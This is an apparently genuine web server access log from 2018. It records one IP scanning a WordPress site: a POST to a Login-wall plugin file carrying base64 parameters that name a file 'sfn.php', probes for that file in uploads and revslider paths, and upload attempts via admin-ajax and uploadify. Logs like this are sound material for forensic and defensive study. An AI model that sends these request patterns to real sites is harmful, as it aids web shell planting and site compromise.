www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:25 +0300] "POST /wp-content/plugins/Login-wall-etgFB/login_wall.php?login=cmd&z3=c2ZuLnBocA%3D%3D&z4=L3dwLWNvbnRlbnQvcGx1Z2lucy8%3d HTTP/1.1" 404 1382 412 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 221 - 17827
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:25 +0300] "POST / HTTP/1.1" 200 652 19671 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 73408 - 17552
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:25 +0300] "GET /wp-content/uploads/sfn.php HTTP/1.1" 404 184 388 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 146 - 8237
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:25 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 695 347 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 167214 - 5145
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:26 +0300] "GET /wp-content/plugins/revslider/temp/update_extract/sfn.php HTTP/1.1" 404 214 418 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 143 - 15910
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:26 +0300] "GET /wp-content/plugins/revslider/sfn.php HTTP/1.1" 404 194 398 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 134 - 17551
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:26 +0300] "POST /license.php HTTP/1.1" 404 573 373 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 153 - 5147
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:26 +0300] "POST /uploadify/uploadify.php?folder=/ HTTP/1.1" 404 585 385 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 189 - 17826
